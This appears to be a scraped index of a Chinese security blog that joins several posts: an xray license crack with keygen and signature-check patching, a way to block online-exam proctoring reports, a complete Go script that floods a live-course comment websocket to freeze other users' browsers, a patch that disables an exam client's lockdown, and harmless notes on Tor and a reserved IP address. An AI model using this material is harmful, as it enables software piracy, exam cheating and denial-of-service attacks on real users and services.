","date":"2020-06-20","objectID":"https://lgf.im/posts/security/reverse/golang-reverse-thinking/:2:2","tags":["coding","reverse","golang"],"title":"Golang逆向思考","uri":"https://lgf.im/posts/security/reverse/golang-reverse-thinking/"},{"categories":["reverse"],"content":" 首先感谢 长亭科技 提供 xray 这款非常方便非常好用的安全工具 俗话说：没有人破解的工具不是好工具 根据没有任何数据支持的统计，大部分安全研究人员使用的安全工具都是盗版 包括但不限于： IDA \\ JEB \\ BurpSuite \\ Vmware 前几天长亭官方有个活动，可以领 2 个月的 xray 社区高级版证书，正好趁这个机会逆向分析了一下 xray 的证书算法，写了一个证书生成器 因为 xray 证书用到了 rsa 算法，所以需要替换 xray 程序中的公钥，将该功能也集成在工具中了 ","date":"2020-06-18","objectID":"https://lgf.im/posts/security/reverse/xray-cracker/:0:0","tags":["coding","cracker","keygen","xray"],"title":"xray社区高级版破解","uri":"https://lgf.im/posts/security/reverse/xray-cracker/"},{"categories":["reverse"],"content":"工具使用 ","date":"2020-06-18","objectID":"https://lgf.im/posts/security/reverse/xray-cracker/:1:0","tags":["coding","cracker","keygen","xray"],"title":"xray社区高级版破解","uri":"https://lgf.im/posts/security/reverse/xray-cracker/"},{"categories":["reverse"],"content":"查看帮助 使用 -h 查看帮助 PS \u003e .\\xray-cracker -h 破解xray高级版证书，使用 -h 参数查看使用帮助 Usage of xray-cracker: -c string 替换xray程序内置公钥，需要指定xray程序文件路径 -g string 生成一个永久license，需要指定用户名 -p string 解析官方证书，需要指定证书路径 ","date":"2020-06-18","objectID":"https://lgf.im/posts/security/reverse/xray-cracker/:1:1","tags":["coding","cracker","keygen","xray"],"title":"xray社区高级版破解","uri":"https://lgf.im/posts/security/reverse/xray-cracker/"},{"categories":["reverse"],"content":"生成证书 使用 -g username 生成永久证书 PS \u003e .\\xray-cracker -g \"我叫啥\" 破解xray高级版证书，使用 -h 参数查看使用帮助 证书已写入文件：xray-license.lic ","date":"2020-06-18","objectID":"https://lgf.im/posts/security/reverse/xray-cracker/:1:2","tags":["coding","cracker","keygen","xray"],"title":"xray社区高级版破解","uri":"https://lgf.im/posts/security/reverse/xray-cracker/"},{"categories":["reverse"],"content":"破解 xray 使用 -c path-to-xray 修改 xray 内置公钥 PS \u003e .\\xray-cracker -c .\\xray_windows_amd64.exe 破解xray高级版证书，使用 -h 参数查看使用帮助 public key index: 16741321 文件写入成功： .\\xray_windows_amd64.exe 工具虽然是 windows 平台下运行，但是照样可以破解其他平台 xray 目前 xray 最新版是 1.0.0，现在全平台全版本通杀 ","date":"2020-06-18","objectID":"https://lgf.im/posts/security/reverse/xray-cracker/:1:3","tags":["coding","cracker","keygen","xray"],"title":"xray社区高级版破解","uri":"https://lgf.im/posts/security/reverse/xray-cracker/"},{"categories":["reverse"],"content":"破解效果 使用修改版 xray 和永久证书后，效果如下 PS \u003e .\\xray_windows_amd64.exe version __ __ _____ __ __ \\ \\ / / | __ \\ /\\ \\ \\ / / \\ V / | |__) | / \\ \\ \\_/ / \u003e \u003c | _ / / /\\ \\ \\ / / . \\ | | \\ \\ / ____ \\ | | /_/ \\_\\ |_| \\_\\ /_/ \\_\\ |_| Version: 1.0.0/62161168/COMMUNITY-ADVANCED Licensed to 我叫啥, license is valid until 2099-09-09 08:00:00 [xray 1.0.0/62161168] Build: [2020-06-13] [windows/amd64] [RELEASE/COMMUNITY-ADVANCED] Compiler Version: go version go1.14.1 linux/amd64 License ID: 00000000000000000000000000000000 User Name: 我叫啥/00000000000000000000000000000000 Not Valid Before: 2020-06-12 00:00:00 Not Valid After: 2099-09-09 08:00:00 ","date":"2020-06-18","objectID":"https://lgf.im/posts/security/reverse/xray-cracker/:2:0","tags":["coding","cracker","keygen","xray"],"title":"xray社区高级版破解","uri":"https://lgf.im/posts/security/reverse/xray-cracker/"},{"categories":["reverse"],"content":"部分细节 距离博文发布已经过了快一个月了，补充一点点细节信息，希望能够帮助到部分研究学习的同学 这里只给出使用的关键函数和关键流程，一些重要参数细节需要自己探索，可以动态单步调试获得 ","date":"2020-06-18","objectID":"https://lgf.im/posts/security/reverse/xray-cracker/:3:0","tags":["coding","cracker","keygen","xray"],"title":"xray社区高级版破解","uri":"https://lgf.im/posts/security/reverse/xray-cracker/"},{"categories":["reverse"],"content":"AES 解密 decode_data, err := base64.StdEncoding.DecodeString(licenseString) if err != nil { panic(err) } aesDecData, err := AesCBCDecryptAndUnPad(decode_data[17:]) if err != nil { panic(err) } licensePlainJsonBytes := aesDecData[0x102:] ","date":"2020-06-18","objectID":"https://lgf.im/posts/security/reverse/xray-cracker/:3:1","tags":["coding","cracker","keygen","xray"],"title":"xray社区高级版破解","uri":"https://lgf.im/posts/security/reverse/xray-cracker/"},{"categories":["reverse"],"content":"RSA 签名验证 sum := sha256.Sum256(licensePlainJsonBytes) err = rsa.VerifyPSS(pubKey, crypto.SHA256, sum[:], aesDecData[2:0x102], nil) ","date":"2020-06-18","objectID":"https://lgf.im/posts/security/reverse/xray-cracker/:3:2","tags":["coding","cracker","keygen","xray"],"title":"xray社区高级版破解","uri":"https://lgf.im/posts/security/reverse/xray-cracker/"},{"categories":["reverse"],"content":"2020 年 8 月 27 日 补充 xray 官方在 1.3.0 版本中更换了授权验证机制，所以破解仅支持到 1.2.0 版本，本文使用代码现在开源： https://github.com/zu1k/xray-crack ","date":"2020-06-18","objectID":"https://lgf.im/posts/security/reverse/xray-cracker/:4:0","tags":["coding","cracker","keygen","xray"],"title":"xray社区高级版破解","uri":"https://lgf.im/posts/security/reverse/xray-cracker/"},{"categories":["reverse"],"content":"2020 年 9 月 30 日 补充 前几天有大佬私发我一个 License，我就又对证书算法研究了一下 相关代码也已经更新到 github 了 ","date":"2020-06-18","objectID":"https://lgf.im/posts/security/reverse/xray-cracker/:5:0","tags":["coding","cracker","keygen","xray"],"title":"xray社区高级版破解","uri":"https://lgf.im/posts/security/reverse/xray-cracker/"},{"categories":["reverse"],"content":"证书生成 证书生成验证整体的思路没有大的改动，还是先 AES 解密，然后 RSA 签名验证，只是前后增加了两处简单的变换 在解密前有一个简单的交换，开始和最后的两个两个没有参与运算（开始第一个字节是证书版本号） right := len(base64DecodeData) - 1 for l := 1; l \u003c right; l++ { r := right - l if l \u003e= r { break } base64DecodeData[l], base64DecodeData[r] = base64DecodeData[r], base64DecodeData[l] } 然后进行 aes 解密，密钥是写死的，IV 是附加在证书里面的，刚刚的变换结束后，除去第一个字节是版本号，紧接着的 16 个字节是 AES 的 IV aesDecData, err := Decrypt(base64DecodeData[17:], base64DecodeData[1:17]) AES 解密后就会遇到另一个变换，是简单的异或处理 for i := 0; i \u003c len(aesDecData); i++ { aesDecData[i] = aesDecData[i] ^ 0x44 } 然后后面的部分就跟之前一样了 ","date":"2020-06-18","objectID":"https://lgf.im/posts/security/reverse/xray-cracker/:5:1","tags":["coding","cracker","keygen","xray"],"title":"xray社区高级版破解","uri":"https://lgf.im/posts/security/reverse/xray-cracker/"},{"categories":["reverse"],"content":"公钥 在新的版本中，RSA 的公钥被加密处理了，在运行的时候解密，这样做可以防止我们通过简单的公钥替换通杀所有的版本和平台 通过逆向发现，解密函数有二百多个局部变量，先是变量之间互相交换，然后两两进行加、减、异或等操作来还原公钥信息 我推测是用程序生成的代码，然后那生成的代码编译的，这样可以在每一次编译的时候重新生成一下代码，增加我们破解的时间 从这一方面出发，我只能变换一下思路，不能去硬刚 Golang 中 RSA 签名验证代码如下： err := rsa.VerifyPSS(pubKey, crypto.SHA256, sum[:], aesDecData[2:0x102], nil) if err != nil { fmt.Println(\"签名验证 失败\") } else { fmt.Println(\"签名验证 成功\") } 很明显，是通过判断返回值是否为空来确定签名验证是否成功的，在汇编中一般为test eax,eax，然后setnz或者setz，所以我可以修改这里 但是这种方法我只能手工修改，目前没有实现用程序来自动化 主要是无法确定应该修改哪一个地方，因为出现了不止一次，一个特征是调用 VerifyPSS 的那个 Call，可以尝试自己解析 pclntab 段，从中还原符号表找到这个验证函数的入口，然后找搜索关键 Call，再在这个 call 后面两三个汇编处找 setnz 或者 setz 进行修改 ","date":"2020-06-18","objectID":"https://lgf.im/posts/security/reverse/xray-cracker/:5:2","tags":["coding","cracker","keygen","xray"],"title":"xray社区高级版破解","uri":"https://lgf.im/posts/security/reverse/xray-cracker/"},{"categories":["reverse"],"content":"2020年10月4日 补充 感谢 @Lz1y 大佬在 PR#3 中提供的思路，现在已能够自动patch非arm版本的xray二进制了 ","date":"2020-06-18","objectID":"https://lgf.im/posts/security/reverse/xray-cracker/:6:0","tags":["coding","cracker","keygen","xray"],"title":"xray社区高级版破解","uri":"https://lgf.im/posts/security/reverse/xray-cracker/"},{"categories":["reverse"],"content":"2020年10月5日 补充 上个版本直接全部进行替换，会导致xray有些功能出现错误，这里进行了修复 增加了 arm 版的自动patch，现在能够全版本破解了 ","date":"2020-06-18","objectID":"https://lgf.im/posts/security/reverse/xray-cracker/:7:0","tags":["coding","cracker","keygen","xray"],"title":"xray社区高级版破解","uri":"https://lgf.im/posts/security/reverse/xray-cracker/"},{"categories":["reverse"],"content":"2020年11月6号晚 补充 刚刚发现又发新版了，新的1.4虽然没有修改证书生成算法，但是针对我上面的patch进行了检查 我前面是对签名验证返回值进行修改，如果签名验证失败就改成验证成功。1.4增加了一次签名验证，验证的内容是错误的，必然会验证失败，如果patch还是修改为验证成功就落入了陷阱 思路是对的，目前完成了amd64平台的自动patch，其他的平台等大佬PR ","date":"2020-06-18","objectID":"https://lgf.im/posts/security/reverse/xray-cracker/:8:0","tags":["coding","cracker","keygen","xray"],"title":"xray社区高级版破解","uri":"https://lgf.im/posts/security/reverse/xray-cracker/"},{"categories":["coding"],"content":"学校使用雨课堂进行在线考试，测试后发现会检测切屏并拍照上传，通过对js代码的分析理清雨课堂监测切屏和上传异常照片的方法，通过插件进行屏蔽","date":"2020-06-12","objectID":"https://lgf.im/posts/security/web-security/yuketang-exam-block-report/","tags":["coding","exam","雨课堂"],"title":"屏蔽雨课堂在线考试异常上报","uri":"https://lgf.im/posts/security/web-security/yuketang-exam-block-report/"},{"categories":["coding"],"content":"学校又开始推雨课堂的在线考试功能了，在老师的配合下稍微分析了一下 因为都是js代码，没有用wasm，分析还是比较简单的 ","date":"2020-06-12","objectID":"https://lgf.im/posts/security/web-security/yuketang-exam-block-report/:0:0","tags":["coding","exam","雨课堂"],"title":"屏蔽雨课堂在线考试异常上报","uri":"https://lgf.im/posts/security/web-security/yuketang-exam-block-report/"},{"categories":["coding"],"content":"切屏检测 考试过程中，如果切换浏览器标签，返回后会有一个切屏警告，并且老师那边也会有切屏记录 通过实验发现如果不切换浏览器标签，使用另一个浏览器窗口或者切换其他软件都不会触发这个记录 相关代码如下 onchange: function (t) { var e = this; if (document.hidden || 0 != e.onlineProctor || e.getCacheResult(), e.onlineProctor \u003e 0) { if (document.hidden) { e.time1 = new Date, e.uploadUnnormal(12) } else x \u0026\u0026 clearTimeout(x), x = setTimeout(function () { e.$alert(\"\", { customClass: \"alertMsg\", showClose: !1, message: \"系统监测到你切出了考试页面\u003cbr/\u003e我们会将此行为报告你的老师\", dangerouslyUseHTMLString: !0, confirmButtonText: \"继续考试\", center: !0, callback: function (t) {} }) }, 1) } else; }, 没有看代码之前我还猜想检查切屏可以通过focus来检查，看了代码后发现使用的是vue的 onchange 进行触发，然就在方法内检查document是否hidden 这样是无法检测到切换不同应用的，简直是自欺欺人啊 注意到检测到切标签后会触发 e.uploadUnnormal(12) 方法，进去看一下 uploadUnnormal: function (t) { var e = this; this.$axios.post(API.feed_add, { exam_id: this.exam_id, action: t }).then(function (t) {}).catch(function (t) { e.$message.error(\"发生错误\") }) } 其中 API.feed_add1 是 /online_proctor/stu/monitor/feed/add 这个路径 也就是说切标签后会 POST 一个标号为12的action记录，抓包后也发现的确如此，也仅仅而已 ","date":"2020-06-12","objectID":"https://lgf.im/posts/security/web-security/yuketang-exam-block-report/:1:0","tags":["coding","exam","雨课堂"],"title":"屏蔽雨课堂在线考试异常上报","uri":"https://lgf.im/posts/security/web-security/yuketang-exam-block-report/"},{"categories":["coding"],"content":"照片上传 查看请求发现图片是先上传到七牛云，然后将返回的连接发给服务器 handleCapture: function () { var t = this, e = this.context, n = this.$refs.video; if (this.isexam) e.drawImage(n, 0, 0, 160, 120); else if (e.drawImage(n, 0, 0, 240, 180), this.reTake) return void this.$emit(\"changeReTake\", !1); setTimeout(function () { var e = t.$refs.canvas.toDataURL(\"image/jpeg\", 1), n = Object(u.b)(e, Date.now()); t.upload(n).then(function (e) { var n = e \u0026\u0026 e.url; t.image_url = n, t.$emit(\"changeReTake\", !0), t.$emit(\"changeCanEnter\", !0), t.isexam \u0026\u0026 t.postRecord(n, 0, 0, 0, 1) }) }, 0) }, upload: function (t) { var e = c.a.qiniuDomain; return new s.a(function (n, r) { var i = { next: function (t) { t.total.percent }, error: function (t) { r({ url: \"\" }) }, complete: function (t) { var r = e + \"/\" + encodeURIComponent(t.key); n({ url: r }) } }; c.a \u0026\u0026 c.a.upload(t, i, \"image\", !1) }) }, postRecord: function (t, e, n, r, i) { var o = { exam_id: this.examid, image_url: t, label: e, event_group_id: n, operator_id: r, action: i }; this.$axios.post(API.upload_photograph, o) .then(function (t) {}) .catch(function (t) {}) } ","date":"2020-06-12","objectID":"https://lgf.im/posts/security/web-security/yuketang-exam-block-report/:2:0","tags":["coding","exam","雨课堂"],"title":"屏蔽雨课堂在线考试异常上报","uri":"https://lgf.im/posts/security/web-security/yuketang-exam-block-report/"},{"categories":["coding"],"content":"如何绕过 那啥，就几个有用的url，反正都是后台请求，当做广告拦截了就行，这样老师那边就没有切屏警告和异常照片了 changjiang-exam.yuketang.cn/online_proctor/stu/monitor/feed/add changjiang-exam.yuketang.cn/online_proctor/stu/photograph/add upload.qiniup.com upload-z1.qiniup.com upload-z2.qiniup.com upload-na0.qiniup.com upload-as0.qiniup.com 插件我用的AdblockPLUS，手动添加几条规则就行，亲测好用 ","date":"2020-06-12","objectID":"https://lgf.im/posts/security/web-security/yuketang-exam-block-report/:3:0","tags":["coding","exam","雨课堂"],"title":"屏蔽雨课堂在线考试异常上报","uri":"https://lgf.im/posts/security/web-security/yuketang-exam-block-report/"},{"categories":["coding"],"content":"前段时间在360网络安全大学听免费的网络安全直播课，里面的老师有一些讲的不错 对评论区进行测试，发现对评论和送花速度没有进行限制，送花有总数50次限制，但是评论总数没有限制 并且，后端性能非常好，能够即时处理所有评论并通过websocket发送给所有直播课的听众 用户的浏览器效率比较低，无法及时处理后端返回的所有评论，从而导致浏览器卡死，如此只需要一个用户不断发送评论包，所有用户都会受到dos攻击 评论代码如下： package main import ( \"flag\" \"log\" \"net/http\" \"net/url\" \"os\" \"os/signal\" \"time\" \"github.com/gorilla/websocket\" ) var addr = flag.String(\"addr\", \"trans.college.360.cn\", \"http service address\") func main() { flag.Parse() log.SetFlags(0) interrupt := make(chan os.Signal, 1) signal.Notify(interrupt, os.Interrupt) u := url.URL{ Scheme: \"wss\", Host: *addr, Path: \"/ws\", RawQuery: \"live_course_id=10114\" } log.Printf(\"connecting to %s\", u.String()) header := make(http.Header) header[\"Origin\"] = []string{\"https://admin.college.360.cn\"} header[\"User-Agent\"] = []string{\"Chrome/80.0.3987.122\"} header[\"Cookie\"] = []string{\"your cookie\"} dialer := websocket.DefaultDialer dialer.EnableCompression = true c, _, err := dialer.Dial(u.String(), header) if err != nil { log.Fatal(\"dial:\", err) } defer c.Close() done := make(chan struct{}) go func() { defer close(done) for { _, message, err := c.ReadMessage() if err != nil { log.Println(\"read:\", err) return } log.Printf(\"recv: %s\", message) } }() ticker := time.NewTicker(1) defer ticker.Stop() for { select { case \u003c-done: return case \u003c-ticker.C: err := c.WriteMessage(websocket.TextMessage, []byte( \"{\\\"cmd\\\":\\\"newMessage\\\",\\\"message\\\":\\\"感谢360\\\"}\" )) if err != nil { log.Println(\"write:\", err) return } case \u003c-interrupt: log.Println(\"interrupt\") err := c.WriteMessage( websocket.CloseMessage, websocket.FormatCloseMessage( websocket.CloseNormalClosure, \"\" ) ) if err != nil { log.Println(\"write close:\", err) return } select { case \u003c-done: case \u003c-time.After(time.Second): } return } } } 可能是360也发现这个dos了，过了不到一个周便修复了，增加了评论速率的限制 ","date":"2020-05-29","objectID":"https://lgf.im/posts/security/web-security/dos-attack-on-360-university-user/:0:0","tags":["coding","dos"],"title":"利用360直播课评论区对用户浏览器dos攻击","uri":"https://lgf.im/posts/security/web-security/dos-attack-on-360-university-user/"},{"categories":["coding"],"content":"昨天看了一篇文章，文章最后使用IP logger进行钓鱼，最后记录下来的IP地址让我大跌眼镜 万万没有想到，记录下来的IP地址竟然是是 244.242.105.51 这可是一个E类IP地址，是属于保留地址，是未来用来做ip研究用的，目前并没有开放使用啊 考虑到文章中是对一个地下黑客组织进行钓鱼，所以我有理由相信，这个访问记录是通过某种高超的我从来没有听说过的手段实现的 IP Logger为啥会记录到这样一个IP的访问呢？ 这个问题一直到现在都在困扰我 下面记录一下我对这个的分析 ","date":"2020-05-25","objectID":"https://lgf.im/posts/events/why-reveice-connection-from-class-e-ip/:0:0","tags":["IP","tor"],"title":"一个来自保留IP地址的连接","uri":"https://lgf.im/posts/events/why-reveice-connection-from-class-e-ip/"},{"categories":["coding"],"content":"大端？小端？ 众所周知计算机程序根据cpu架构和操作系统种类不同，数据在内存中存放有大端序和小端序两种情况，这个顺序叫做主机序 而网络传输需要在不同主机序的计算机之间兼容，所以又规定了一个网络序，规定网络传输一律使用大端序 文章中作者猜测是访问者使用的主机是小端序的，所以会又这样一个记录 我个人认为这个猜测不成立 因为一般ip层报文都是由操作系统网络栈来构造的，操作系统自身不会犯忘记转换成网络序的错误 即使是访问者技术高超自己写代码构造的ip包，那源ip是E类ip地址，返程的ip包根本没有路由啊，这样子连tcp连接都建立不了，更不要谈ip logger记录下浏览器的user-agent ","date":"2020-05-25","objectID":"https://lgf.im/posts/events/why-reveice-connection-from-class-e-ip/:1:0","tags":["IP","tor"],"title":"一个来自保留IP地址的连接","uri":"https://lgf.im/posts/events/why-reveice-connection-from-class-e-ip/"},{"categories":["coding"],"content":"Tor? 考虑到记录下来的user-agent与tor浏览器的一致，并且对方是黑客组织，使用tor也是非常普遍，所以分析一下通过tor能不能实现伪造自己的ip为E类ip tor连接的流程中，每个tor relay不会知道完整的路由路径，只知道上一个节点与下一个节点，并且这个路由是在应用层实现的，如果黑客控制了某些tor relay，通过这些relay能不能实现这个伪造？ ","date":"2020-05-25","objectID":"https://lgf.im/posts/events/why-reveice-connection-from-class-e-ip/:2:0","tags":["IP","tor"],"title":"一个来自保留IP地址的连接","uri":"https://lgf.im/posts/events/why-reveice-connection-from-class-e-ip/"},{"categories":["coding"],"content":"提供onion service 如果ip logger提供onion service，那他记录下来的ip应该是 会合节点的ip 通过我上一篇博客学习的内容可以知道，这个会合节点是由客户端选择的，所以我们假设黑客这里选择了自己控制的某个tor relay作为会合节点，并且将这个E类ip地址写在介绍信中发送给介绍节点 ip logger服务器如果没有怀疑这个E类IP地址，通过tor网络去连接这个会合节点，那在它的exit relay那里一定会连不上这个ip，因为会出现空路由 所以如果要让连接成功建立，必须让ip logger到会合节点的relay路径中某个relay节点对这个错误的ip进行了更正，最简单的是控制exit relay，检查到最终访问的是错误ip便进行更正 而这个relay路径中的每个relay都是ip logger自己选择的，所以黑客需要控制tor网络中的大部分relay????这不现实！！！ ","date":"2020-05-25","objectID":"https://lgf.im/posts/events/why-reveice-connection-from-class-e-ip/:2:1","tags":["IP","tor"],"title":"一个来自保留IP地址的连接","uri":"https://lgf.im/posts/events/why-reveice-connection-from-class-e-ip/"},{"categories":["coding"],"content":"不提供onion service 如果ip logger不是提供onion service，而是提供公开的服务，那它记录下来的应该是 黑客选择的exit relay，即使黑客控制了这个relay也没办法伪造ip啊 所以通过tor的某些机制伪造成这个E类ip不太现实 ","date":"2020-05-25","objectID":"https://lgf.im/posts/events/why-reveice-connection-from-class-e-ip/:2:2","tags":["IP","tor"],"title":"一个来自保留IP地址的连接","uri":"https://lgf.im/posts/events/why-reveice-connection-from-class-e-ip/"},{"categories":["coding"],"content":"路由劫持？ 我对公网的路由不太了解，但是看样子进行路由劫持是有可能的 如果黑客创建了一条假的路由路径，并在路由途中的某个节点对这个E类ip进行更正，也是有可能的，不过看起来难度很大啊 才疏学浅，文中可能有错误，欢迎指正 目前这个问题还在困扰我，如果有大佬知道答案，希望能够告诉我 ","date":"2020-05-25","objectID":"https://lgf.im/posts/events/why-reveice-connection-from-class-e-ip/:3:0","tags":["IP","tor"],"title":"一个来自保留IP地址的连接","uri":"https://lgf.im/posts/events/why-reveice-connection-from-class-e-ip/"},{"categories":["coding"],"content":"昨天遇到了点问题，为了研究清楚原理，把Tor客户端与服务端通信的具体流程学习了一下，这篇博文写来记录 ","date":"2020-05-25","objectID":"https://lgf.im/posts/learn/how-do-onion-service-work/:0:0","tags":["tor","onion"],"title":"Tor洋葱服务如何工作","uri":"https://lgf.im/posts/learn/how-do-onion-service-work/"},{"categories":["coding"],"content":"通信流程 这里要描述的通讯是 用户通过 tor浏览器 连接 洋葱服务 的过程 为了方便表达，这里用Alice表示客户端，Bob表示服务端 ","date":"2020-05-25","objectID":"https://lgf.im/posts/learn/how-do-onion-service-work/:1:0","tags":["tor","onion"],"title":"Tor洋葱服务如何工作","uri":"https://lgf.im/posts/learn/how-do-onion-service-work/"},{"categories":["coding"],"content":"第一步：服务端设置自己的介绍节点 服务端为了不暴漏自己的IP，使用 介绍节点(introduction points) 来转发来自客户端的介绍信 首先，Bob从 tor中继节点列表 中挑选几个节点来做自己的 介绍节点，然后与它们建立 长连接(long-term circuits) 这里的长连接是通过tor网络建立起来的，所以是匿名的，介绍节点不会知道Bob的IP 同时，Bob会给介绍节点发送一个 身份验证密钥(authentication key)，当有客户端连接这个介绍节点时，通过这个密钥便能判断这个连接是否是找Bob的 ","date":"2020-05-25","objectID":"https://lgf.im/posts/learn/how-do-onion-service-work/:1:1","tags":["tor","onion"],"title":"Tor洋葱服务如何工作","uri":"https://lgf.im/posts/learn/how-do-onion-service-work/"},{"categories":["coding"],"content":"第二步：服务端公开自己的信息 Bob 生成一个 描述信息(onion service descriptor)，里面存储了介绍节点列表，包括介绍节点的ip和相应的身份验证密钥 然后Bob用自己的私钥对这个消息签名，并将这个消息发布到Tor的DHT中 经过这步操作，tor客户端便可以通过某个key从DHT中获取到这个消息，从而找到Bob的介绍节点 ","date":"2020-05-25","objectID":"https://lgf.im/posts/learn/how-do-onion-service-work/:1:2","tags":["tor","onion"],"title":"Tor洋葱服务如何工作","uri":"https://lgf.im/posts/learn/how-do-onion-service-work/"},{"categories":["coding"],"content":"第三步：客户端获取介绍节点列表 Alice（客户端）从某些途径知道Bob有一个洋葱服务，并且知道这个服务的onion域名，例如 xyz.onion，此时Alice想要访问Bob. 首先，她向DHT网络请求该域名对应的信息，也就是第二步中Bob发布的那个描述消息 获取到消息后，Alice对其签名进行验证，验证使用的Bob的公钥其实已经被编码到 xyz.onion 这个域名中了，Alice可以从域名中解码出来 消息没问题，Alice从消息中解析出Bob的介绍节点列表，选择其中一个介绍节点，Alice将要向Bob介绍自己 ","date":"2020-05-25","objectID":"https://lgf.im/posts/learn/how-do-onion-service-work/:1:3","tags":["tor","onion"],"title":"Tor洋葱服务如何工作","uri":"https://lgf.im/posts/learn/how-do-onion-service-work/"},{"categories":["coding"],"content":"第四步：客户端选择一个会合节点 Alice从tor中继节点列表中选择一个节点作为 会合节点(rendezvous point)，然后通过tor与该 会合节点(RP) 建立连接 同时，Alice会给会合节点发送一个 一次性密码(one-time secret)，这个密码会在回合过程中使用 ","date":"2020-05-25","objectID":"https://lgf.im/posts/learn/how-do-onion-service-work/:1:4","tags":["tor","onion"],"title":"Tor洋葱服务如何工作","uri":"https://lgf.im/posts/learn/how-do-onion-service-work/"},{"categories":["coding"],"content":"第五步：客户端向服务端介绍自己 Alice生成一个消息，包含 会合节点 和 一次性密码，然后用Bob的公钥对消息进行加密 Alice通过Tor网络连接上 Bob 的一个介绍节点，让该介绍节点把加密后的消息转发给Bob ","date":"2020-05-25","objectID":"https://lgf.im/posts/learn/how-do-onion-service-work/:1:5","tags":["tor","onion"],"title":"Tor洋葱服务如何工作","uri":"https://lgf.im/posts/learn/how-do-onion-service-work/"},{"categories":["coding"],"content":"第六步：服务端与客户端回合 此时Bob已经收到介绍节点转发过来的消息，知道Alice想要访问自己，并且知道了会合节点的信息 Bob通过Tor网络连接会合节点，然后将收到的一次性密码发送给会合节点，会合节点由此知道 Bob是要与Alice通信，从而可以将Alice与Bob的消息进行中继 ","date":"2020-05-25","objectID":"https://lgf.im/posts/learn/how-do-onion-service-work/:1:6","tags":["tor","onion"],"title":"Tor洋葱服务如何工作","uri":"https://lgf.im/posts/learn/how-do-onion-service-work/"},{"categories":["coding"],"content":"安全性 客户端与服务端最终是通过会合节点通讯的，他们都各自通过tor网络分别连接会合节点，因此既能够保证客户端的隐匿性又能够保证服务端不暴露 在上面流程中的所有通讯都是用过tor网络建立的，包括 服务端与介绍节点的通讯、客户端与介绍节点的通讯、客户端与会合节点的通讯、服务端与会合节点的通讯 因此，正常情况下tor客户端与洋葱服务通讯是经过6次中转的，包括客户端连接会合节点的3次和服务端连接会合节点的3次 如果tor客户端访问的服务不是洋葱服务，那通讯过程就不是上面那个流程了，也只有3次中转了 ","date":"2020-05-25","objectID":"https://lgf.im/posts/learn/how-do-onion-service-work/:2:0","tags":["tor","onion"],"title":"Tor洋葱服务如何工作","uri":"https://lgf.im/posts/learn/how-do-onion-service-work/"},{"categories":["coding"],"content":"参考资料 https://community.torproject.org/onion-services/overview/ ","date":"2020-05-25","objectID":"https://lgf.im/posts/learn/how-do-onion-service-work/:3:0","tags":["tor","onion"],"title":"Tor洋葱服务如何工作","uri":"https://lgf.im/posts/learn/how-do-onion-service-work/"},{"categories":["reverse"],"content":"前言 近期，学校开始测试线上考试系统，据说十分流氓，开搞！ 从大一学弟那里拿到了相关程序和说明文档，经过学弟的使用体验，程序开始运行会自动杀死QQ、微信等程序，隐藏并屏蔽任务栏和开始菜单，强制全屏并屏蔽一些常用的快捷键包括窗口切换等。 ","date":"2020-05-01","objectID":"https://lgf.im/posts/security/reverse/crack-sdu-online-exam-software/:1:0","tags":["reverse","sdu","coding","crack"],"title":"逆向破解学校在线考试客户端","uri":"https://lgf.im/posts/security/reverse/crack-sdu-online-exam-software/"},{"categories":["reverse"],"content":"开搞 ","date":"2020-05-01","objectID":"https://lgf.im/posts/security/reverse/crack-sdu-online-exam-software/:2:0","tags":["reverse","sdu","coding","crack"],"title":"逆向破解学校在线考试客户端","uri":"https://lgf.im/posts/security/reverse/crack-sdu-online-exam-software/"},{"categories":["reverse"],"content":"基本信息 在虚拟机里安装程序后，先观察一下安装目录结构和里面的文件 仔细查看了各个文件夹下的内容，最终得出结论，是个QT编写的套壳浏览器，用的 QtWebEngine 查看主程序的信息，32位未加壳C++程序，本身非常小，只有不到1M，大部分功能应该都是调库实现的 下面开始逆向，拖入IDA 32位，自动定位到入口函数start，从执行流图中可以看到程序本身结构非常简单 ","date":"2020-05-01","objectID":"https://lgf.im/posts/security/reverse/crack-sdu-online-exam-software/:2:1","tags":["reverse","sdu","coding","crack"],"title":"逆向破解学校在线考试客户端","uri":"https://lgf.im/posts/security/reverse/crack-sdu-online-exam-software/"},{"categories":["reverse"],"content":"正着走 下面从start开始分析 可以看到一开始start函数的栈指针分析就出问题了，但是start本身的调用非常简单，不妨来看一下 首先是 第一个call指令，进入这个函数 发现是 security_cookie检查，没有什么实际作用 第二个是个无条件跳转 jmp，进去看一下 可以看到这一段东西比较多，特别是各种不知道什么作用的call非常多，并且自动反编译出问题了，这个反编译问题应该是比较好解决的，我没有深究 简单看了一下调用的call，越深入越复杂，到这里分析不下去了，东西有点多，从其他方面入手 ","date":"2020-05-01","objectID":"https://lgf.im/posts/security/reverse/crack-sdu-online-exam-software/:2:2","tags":["reverse","sdu","coding","crack"],"title":"逆向破解学校在线考试客户端","uri":"https://lgf.im/posts/security/reverse/crack-sdu-online-exam-software/"},{"categories":["reverse"],"content":"去除杀进程 先来看一下字符串，很幸运字符串没有进行加密，因为我们知道程序会杀死qq，不如直接来搜索关键字QQ 看一下交叉引用 只有一个函数调用了它，先进入看看这个函数，关键部分如下 这就比较清楚了，程序是通过QProcess调用taskkill命令来强制来杀死这些程序的，会被杀死的程序包括实时聊天软件qq、微信，远程协助软件teamviwer、向日葵远程控制。 在这里我们需要去除这个杀死进程的机制，直接将执行的命令字符串给清空就行 ","date":"2020-05-01","objectID":"https://lgf.im/posts/security/reverse/crack-sdu-online-exam-software/:2:3","tags":["reverse","sdu","coding","crack"],"title":"逆向破解学校在线考试客户端","uri":"https://lgf.im/posts/security/reverse/crack-sdu-online-exam-software/"},{"categories":["reverse"],"content":"去除隐藏任务栏 同时这段命令所在的这个函数在前面还有一堆对QtWebEngine的初始化 这个函数后面的部分有点意思，看到了一些字符串不清楚什么意思 我个人对tray比较敏感，因为做过任务栏图标程序的开发，知道任务栏的英文是tray 这里对 Shell_TrayWhd 进行搜索 发现windows系统有一些特殊的窗口句柄，而这个正式任务栏窗口句柄 一开始我还对这个考试程序怎么隐藏任务栏感兴趣，现在都一目了然了，先通过系统函数获得句柄，然后调用ShowWindow将窗口设置为不显示 这里的ProgMan是任务管理器，所以说这段代码同时屏蔽了任务栏、开始菜单和任务管理器 我们需要去除这种屏蔽机制，这也非常简单，来看汇编 发现在调用showwindow前需要将参数 True or False push入栈，也就是 call ShowWindow前面的push 0，只需要修改这几处汇编即可 将push 0修改为push 1即可去除他的屏蔽(后面的分析知道 push 5 比较好) 